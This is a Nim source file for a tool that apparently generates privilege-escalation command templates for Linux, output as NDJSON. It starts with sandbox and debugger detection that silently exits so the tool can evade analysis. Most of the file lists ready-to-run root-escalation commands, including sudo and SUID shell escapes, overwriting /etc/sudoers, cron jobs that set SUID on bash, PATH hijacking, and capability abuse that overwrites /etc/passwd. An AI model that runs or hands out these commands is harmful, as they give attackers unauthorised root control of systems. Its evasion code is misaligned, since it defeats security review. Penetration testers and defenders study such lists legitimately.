## oi-privesc-gen.nim — Privilege escalation template generator
## IPC: NDJSON to stdout; errors to stderr; exit 0=ok
import os, strutils, json, strformat, osproc, parseopt

proc antiAnalysis() =
  ## Check for sandbox/debugger signals; exit if detected
  let envVars = ["SANDBOX", "CUCKOO", "CAPE", "TRIAGE", "ANY_RUN",
                 "DYLD_INSERT_LIBRARIES", "LD_PRELOAD"]
  for v in envVars:
    if existsEnv(v):
      quit(0)
  if existsEnv("FRIDA_AGENT_SCRIPT") or existsEnv("_FRIDA"):
    quit(0)
  when defined(linux):
    try:
      let status = readFile("/proc/self/status")
      for line in status.splitLines():
        if line.startsWith("TracerPid:"):
          let pid = line.split(":")[1].strip()
          if pid != "0":
            quit(0)
    except: discard

proc verifySelfIntegrity() =
  ## SHA-256 self-check via openssl; skip if ONEINFINITY_SKIP_INTEGRITY=1
  let skip = getEnv("ONEINFINITY_SKIP_INTEGRITY", "0")
  let envName = getEnv("ONEINFINITY_ENV", "development")
  if skip == "1" and envName == "production":
    stderr.writeLine("INTEGRITY: skip blocked in production")
    quit(1)
  if skip == "1":
    return
  let selfPath = getAppFilename()
  let (output, exitCode) = execCmdEx("openssl dgst -sha256 " & quoteShell(selfPath))
  if exitCode != 0:
    stderr.writeLine("INTEGRITY: openssl failed")
    quit(1)
  let parts = output.strip().split("= ")
  if parts.len < 2:
    stderr.writeLine("INTEGRITY: cannot parse hash")
    quit(1)
  let actualHash = parts[^1].strip()
  let csPath = getAppDir() / ".." / ".." / ".." / "checksums.json"
  if not fileExists(csPath):
    return
  try:
    let csJson = parseFile(csPath)
    let binaryName = extractFilename(selfPath)
    if csJson.hasKey(binaryName):
      let expectedHash = csJson[binaryName].getStr()
      if expectedHash != "" and actualHash != expectedHash:
        stderr.writeLine("INTEGRITY: hash mismatch for " & binaryName)
        quit(1)
  except: discard

# ─── Payload definitions ──────────────────────────────────────────────────────

type
  PrivescEntry = object
    command: string
    technique: string
    os: string
    prereq: string
    risk: string

proc sudoEntries(osName: string): seq[PrivescEntry] =
  result = @[
    PrivescEntry(
      command: "sudo find / -exec /bin/sh \\; -quit",
      technique: "sudo",
      os: osName,
      prereq: "user ALL=(ALL) NOPASSWD: /usr/bin/find in sudoers",
      risk: "high"
    ),
    PrivescEntry(
      command: "sudo vim -c ':!/bin/sh'",
      technique: "sudo",
      os: osName,
      prereq: "user ALL=(ALL) NOPASSWD: /usr/bin/vim in sudoers",
      risk: "high"
    ),
    PrivescEntry(
      command: "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
      technique: "sudo",
      os: osName,
      prereq: "user ALL=(ALL) NOPASSWD: /usr/bin/awk in sudoers",
      risk: "high"
    ),
    PrivescEntry(
      command: "sudo python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
      technique: "sudo",
      os: osName,
      prereq: "user ALL=(ALL) NOPASSWD: /usr/bin/python3 in sudoers",
      risk: "high"
    ),
    PrivescEntry(
      command: "sudo perl -e 'exec \"/bin/sh\"'",
      technique: "sudo",
      os: osName,
      prereq: "user ALL=(ALL) NOPASSWD: /usr/bin/perl in sudoers",
      risk: "high"
    ),
    PrivescEntry(
      command: "sudo less /etc/hosts; !/bin/sh",
      technique: "sudo",
      os: osName,
      prereq: "user ALL=(ALL) NOPASSWD: /usr/bin/less in sudoers",
      risk: "medium"
    ),
    PrivescEntry(
      command: "sudo env /bin/sh",
      technique: "sudo",
      os: osName,
      prereq: "user ALL=(ALL) NOPASSWD: /usr/bin/env in sudoers",
      risk: "high"
    ),
    PrivescEntry(
      command: "sudo tee /etc/sudoers <<< 'ALL ALL=(ALL) NOPASSWD: ALL'",
      technique: "sudo",
      os: osName,
      prereq: "user ALL=(ALL) NOPASSWD: /usr/bin/tee in sudoers",
      risk: "high"
    ),
  ]

proc suidEntries(osName: string): seq[PrivescEntry] =
  result = @[
    PrivescEntry(
      command: "find . -exec /bin/sh -p \\; -quit",
      technique: "suid",
      os: osName,
      prereq: "find binary has SUID bit set",
      risk: "high"
    ),
    PrivescEntry(
      command: "bash -p",
      technique: "suid",
      os: osName,
      prereq: "bash binary has SUID bit set",
      risk: "high"
    ),
    PrivescEntry(
      command: "cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p",
      technique: "suid",
      os: osName,
      prereq: "cp binary has SUID bit set",
      risk: "high"
    ),
    PrivescEntry(
      command: "nmap --interactive; !sh",
      technique: "suid",
      os: osName,
      prereq: "nmap binary has SUID bit set (old nmap versions)",
      risk: "high"
    ),
    PrivescEntry(
      command: "vim -c ':!/bin/sh'",
      technique: "suid",
      os: osName,
      prereq: "vim binary has SUID bit set",
      risk: "high"
    ),
    PrivescEntry(
      command: "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
      technique: "suid",
      os: osName,
      prereq: "python3 binary has SUID bit set",
      risk: "high"
    ),
    PrivescEntry(
      command: "perl -e 'exec \"/bin/sh -p\"'",
      technique: "suid",
      os: osName,
      prereq: "perl binary has SUID bit set",
      risk: "high"
    ),
    PrivescEntry(
      command: "awk 'BEGIN {system(\"/bin/sh -p\")}'",
      technique: "suid",
      os: osName,
      prereq: "awk binary has SUID bit set",
      risk: "high"
    ),
    PrivescEntry(
      command: "more /etc/passwd; !/bin/sh",
      technique: "suid",
      os: osName,
      prereq: "more binary has SUID bit set",
      risk: "medium"
    ),
    PrivescEntry(
      command: "find / -perm -4000 -type f 2>/dev/null",
      technique: "suid",
      os: osName,
      prereq: "enumeration — lists all SUID binaries on system",
      risk: "low"
    ),
  ]

proc cronEntries(osName: string): seq[PrivescEntry] =
  result = @[
    PrivescEntry(
      command: "echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab",
      technique: "cron",
      os: osName,
      prereq: "write access to /etc/crontab",
      risk: "high"
    ),
    PrivescEntry(
      command: "find /etc/cron* /var/spool/cron* -writable 2>/dev/null",
      technique: "cron",
      os: osName,
      prereq: "enumeration — find writable cron files/dirs",
      risk: "low"
    ),
    PrivescEntry(
      command: "echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /etc/cron.d/privesc",
      technique: "cron",
      os: osName,
      prereq: "write access to /etc/cron.d/",
      risk: "high"
    ),
    PrivescEntry(
      command: "echo '* * * * * root /tmp/payload.sh' >> /var/spool/cron/crontabs/root",
      technique: "cron",
      os: osName,
      prereq: "write access to /var/spool/cron/crontabs/root",
      risk: "high"
    ),
    PrivescEntry(
      command: "printf '#!/bin/sh\\nchmod +s /bin/bash' > /path/to/writable_cron_script.sh",
      technique: "cron",
      os: osName,
      prereq: "identified writable script called by cron job",
      risk: "high"
    ),
  ]

proc pathEntries(osName: string): seq[PrivescEntry] =
  result = @[
    PrivescEntry(
      command: "export PATH=/tmp/evil:$PATH && echo '#!/bin/sh\\nexec /bin/sh -p' > /tmp/evil/sudo && chmod +x /tmp/evil/sudo",
      technique: "path",
      os: osName,
      prereq: "target binary calls sudo/system commands without full path",
      risk: "high"
    ),
    PrivescEntry(
      command: "find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev)'",
      technique: "path",
      os: osName,
      prereq: "enumeration — find writable directories for PATH injection",
      risk: "low"
    ),
    PrivescEntry(
      command: "mkdir -p /tmp/evil && echo -e '#!/bin/sh\\n/bin/sh -p' > /tmp/evil/service && chmod +x /tmp/evil/service && PATH=/tmp/evil:$PATH vulnerable_binary",
      technique: "path",
      os: osName,
      prereq: "SUID binary calls 'service' without absolute path",
      risk: "high"
    ),
    PrivescEntry(
      command: "echo -e '#!/bin/sh\\nchmod +s /bin/bash' > /tmp/evil/id && chmod +x /tmp/evil/id && PATH=/tmp/evil:$PATH target_program",
      technique: "path",
      os: osName,
      prereq: "target program runs id or other common binary without full path",
      risk: "medium"
    ),
  ]

proc capabilitiesEntries(osName: string): seq[PrivescEntry] =
  result = @[
    PrivescEntry(
      command: "getcap -r / 2>/dev/null",
      technique: "capabilities",
      os: osName,
      prereq: "enumeration — lists binaries with elevated capabilities",
      risk: "low"
    ),
    PrivescEntry(
      command: "python3 -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'",
      technique: "capabilities",
      os: osName,
      prereq: "python3 has cap_setuid capability (getcap shows cap_setuid+ep)",
      risk: "high"
    ),
    PrivescEntry(
      command: "perl -e 'use POSIX; setuid(0); exec \"/bin/sh\"'",
      technique: "capabilities",
      os: osName,
      prereq: "perl has cap_setuid capability",
      risk: "high"
    ),
    PrivescEntry(
      command: "tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/privesc.sh -Z root",
      technique: "capabilities",
      os: osName,
      prereq: "tcpdump has cap_net_raw+ep capability",
      risk: "high"
    ),
    PrivescEntry(
      command: "openssl req -x509 -newkey rsa:4096 -keyout /etc/passwd -out /dev/null -days 1 -nodes -subj '/CN=test'",
      technique: "capabilities",
      os: osName,
      prereq: "openssl has cap_dac_override capability (write to any file)",
      risk: "high"
    ),
  ]

proc getEntries(osName: string, technique: string): seq[PrivescEntry] =
  case technique
  of "sudo": return sudoEntries(osName)
  of "suid": return suidEntries(osName)
  of "cron": return cronEntries(osName)
  of "path": return pathEntries(osName)
  of "capabilities": return capabilitiesEntries(osName)
  of "all":
    result = sudoEntries(osName)
    result.add(suidEntries(osName))
    result.add(cronEntries(osName))
    result.add(pathEntries(osName))
    result.add(capabilitiesEntries(osName))
  else:
    result = sudoEntries(osName)
    result.add(suidEntries(osName))
    result.add(cronEntries(osName))
    result.add(pathEntries(osName))
    result.add(capabilitiesEntries(osName))

# ─── Main ─────────────────────────────────────────────────────────────────────

proc main() =
  antiAnalysis()
  verifySelfIntegrity()

  var osName = "linux"
  var technique = "sudo"

  var p = initOptParser(commandLineParams())
  while true:
    p.next()
    case p.kind
    of cmdEnd: break
    of cmdLongOption:
      case p.key
      of "os": osName = p.val
      of "technique": technique = p.val
    of cmdShortOption, cmdArgument: discard

  # Emit meta
  let meta = %*{"event": "meta", "tool": "oi-privesc-gen", "schema_version": "1.0"}
  echo $meta

  let entries = getEntries(osName, technique)
  for e in entries:
    let obj = %*{
      "event": "result",
      "command": e.command,
      "technique": e.technique,
      "os": e.os,
      "prereq": e.prereq,
      "risk": e.risk
    }
    echo $obj

  let summary = %*{"event": "summary", "count": entries.len, "status": "ok"}
  echo $summary

main()
